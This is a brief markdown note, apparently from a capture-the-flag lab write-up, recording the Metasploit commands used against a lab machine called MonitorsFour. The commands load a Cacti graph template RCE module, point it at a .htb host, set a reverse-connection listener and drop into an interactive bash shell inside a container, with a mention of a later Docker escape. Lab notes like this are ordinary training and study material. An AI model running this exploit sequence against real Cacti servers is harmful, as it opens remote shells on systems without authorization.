# Metasploit Framework

Exploitation framework used for one public RCE where writing the exploit by hand would be redundant. Also convenient for handling staged payloads and sessions.

## Commands Used

### Cacti graph template RCE
```
msfconsole
use multi/http/cacti_graph_template_rce
set RHOSTS cacti.monitorsfour.htb
set VHOST  cacti.monitorsfour.htb
set TARGET 0          # Linux (container)
set LHOST  tun0
run
sessions -i 1
shell
/bin/bash -i
```
Used on: **MonitorsFour** — lands a shell inside the Cacti Docker container, from which the Docker API escape is performed.
